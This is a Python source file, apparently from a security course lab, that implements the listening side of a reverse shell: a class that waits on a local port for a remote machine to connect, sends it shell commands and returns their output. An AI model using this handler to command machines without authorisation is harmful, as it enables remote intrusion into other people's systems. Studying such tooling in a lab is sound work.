import socket
import threading
import time


"""
This file is a modified version of lab5_chat/my_socket.py, 
with some minor changes to variable names and comments. 
The functionality remains the same, 
providing a reverse shell implementation that 
listens for incoming connections on a specified local port (lport).

It essentially creates a socket server that waits for a connection from a remote client. 
It's very much just NC (netcat) in Python.
"""

class DavesReverseShell:
    def __init__(self, lport):
        self.lport = lport
        self.shell_connection = None
        self.connected_event = threading.Event()

    def __enter__(self):
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind(("", self.lport))
        soc.listen(1)

        def _accept_loop(sock):
            try:
                conn, _ = sock.accept()
                print(f"[+] Received connection from {conn.getpeername()}")
                conn.settimeout(None)
                self.shell_connection = self.shell_connection or conn
                time.sleep(0.5)
                self.connected_event.set()
                self.get("")
            except Exception as exc:
                print(f"[-] Thread connection error: {exc}")

        connection_thread = threading.Thread(target=_accept_loop, args=(soc,), daemon=True)
        connection_thread.start()
        time.sleep(0.5)
        print(f"[+] Shell server listening on port {self.lport}")
        return self

    def get(self, cmd, *, timeout=2.5):
        self.connected_event.wait()
        self.shell_connection.settimeout(timeout)
        full_cmd = f"{cmd}\n"
        print(f"[*] Sending command: {cmd}")
        self.shell_connection.sendall(full_cmd.encode())
        time.sleep(0.2)

        output = ""
        while True:
            try:
                data = self.shell_connection.recv(4096).decode(errors="ignore")
                if not data:
                    break
                output += data
            except socket.timeout:
                break

        cleaned = output.replace("\x08", "").strip().splitlines()
        cleaned = [line for line in cleaned if not line.strip().endswith(cmd)]
        cleaned = [line for line in cleaned if not line.strip().endswith("$")]
        return cleaned[0] if cleaned else None

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.get("exit", timeout=1)
        time.sleep(3)
